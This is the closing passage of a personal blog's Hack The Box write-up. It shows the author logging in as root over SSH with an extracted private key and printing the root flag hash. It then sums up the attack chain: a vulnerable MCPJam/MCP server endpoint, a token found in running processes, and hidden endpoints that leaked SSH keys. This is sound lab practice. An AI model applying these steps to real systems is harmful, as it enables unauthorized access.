+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># In nano, I pasted the contents of the key</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿esteban<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# nano root_key  
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Then, I set its permissions                                                </span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿esteban<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# chmod <span style="color:#ae81ff">600</span> root_key             
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Finally, I got connected                     </span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿esteban<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# ssh -i root_key root@10.129.37.179
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.129.37.179 (10.129.37.179)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:K64LcxfMoWF9TY77Q+quN1nvBzFftQ11ZxoH8eULpCs.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This host key is known by the following other names/addresses:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ~/.ssh/known_hosts:22: [hashed name]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.129.37.179<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span> to the list of known hosts.
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 22.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 5.15.0-179-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/pro
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> System information as of Thu Jun <span style="color:#ae81ff">25</span> 12:28:21 AM UTC <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System load:           0.16
+</span></span><span style="display:flex;"><span>  Usage of /:            76.6% of 9.50GB
+</span></span><span style="display:flex;"><span>  Memory usage:          16%
+</span></span><span style="display:flex;"><span>  Swap usage:            0%
+</span></span><span style="display:flex;"><span>  Processes:             <span style="color:#ae81ff">230</span>
+</span></span><span style="display:flex;"><span>  Users logged in:       <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> eth0: 10.129.37.179
+</span></span><span style="display:flex;"><span>  IPv6 address <span style="color:#66d9ef">for</span> eth0: dead:beef::a0de:adff:fe6b:71fd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+</span></span><span style="display:flex;"><span>   just raised the bar <span style="color:#66d9ef">for</span> easy, resilient and secure K8s cluster deployment.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Expanded Security Maintenance <span style="color:#66d9ef">for</span> Applications is not enabled.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates can be applied immediately.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> additional security update can be applied with ESM Apps.
+</span></span><span style="display:flex;"><span>Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.
+</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Thu Jun <span style="color:#ae81ff">25</span> 00:28:22 <span style="color:#ae81ff">2026</span> from 10.10.16.192
+</span></span><span style="display:flex;"><span>root@devhub:~# </span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>I grabbed the <strong>root.txt</strong> flag in the <strong>/root</strong> directory and wrapped it up:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@devhub:~# ls
+</span></span><span style="display:flex;"><span>root.txt  snap
+</span></span><span style="display:flex;"><span>root@devhub:~# cat root.txt
+</span></span><span style="display:flex;"><span>7403c20012cf2f83869a4fcfd7ac0325</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><h2 id="takeaways" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>TAKEAWAYS</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>This machine served as a nice refresher on leveraging vulnerable MCP servers, and it was also great practice for internal process enumeration. The initial point of entry came from the <strong>MCPJam</strong> endpoint, just like in the <em>Kobold</em> HTB machine I wrote about on this site last month. Enumerating the machine internally for running processes revealed a token, which I used to move laterally, and hidden endpoints for SSH key extraction. Overall, a real fun experience and a nice form of strengthening my enumeration and privilege escalation skills.</p>
+
+        </div>
+      </div>
+
+      
+    </article>
+
+    <div class="hidden lg:block col-span-2"></div>
+  </div>
+</main>
+
+      </div>
+
+    </div>
+  </main>
+
+  <footer>
+    <div class="border-t border-gray-800 bg-[#070709] text-gray-400">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6">
+    <div class="flex flex-col md:flex-row items-center justify-between py-6 space-y-4 md:space-y-0">
+
+      
+      <div class="text-sm sm:text-base md:text-lg">
+        <span class="relative inline-block">
+          © 2026 Esteban Pangelinan. All rights reserved. <br>
+          Made with <a href="https://gohugo.io" target="_blank">Hugo</a> | <a
+            href="https://github.com/Enerhim/enervoid-theme" target="_blank">Enervoid</a>
+        </span>
+      </div>
+
+      
+      <div class="flex items-center space-x-6 text-sm sm:text-base md:text-lg">
+
+        
+        <a href='https://github.com/est706' target="_blank" rel="noopener"
+          class="group relative inline-block transition-colors duration-200 hover:text-gray-200">
+          
+          <i class="devicon-github-original"></i>
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </a>
+        
+        <a href='https://www.linkedin.com/in/esteban-pangelinan-385249210/' target="_blank" rel="noopener"
+          class="group relative inline-block transition-colors duration-200 hover:text-gray-200">
+          
+          <i class="devicon-linkedin-plain"></i>
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </a>
+        
+
+      </div>
+    </div>
+  </div>
+</div>
+
+  </footer>
+</body>
+
+</html>
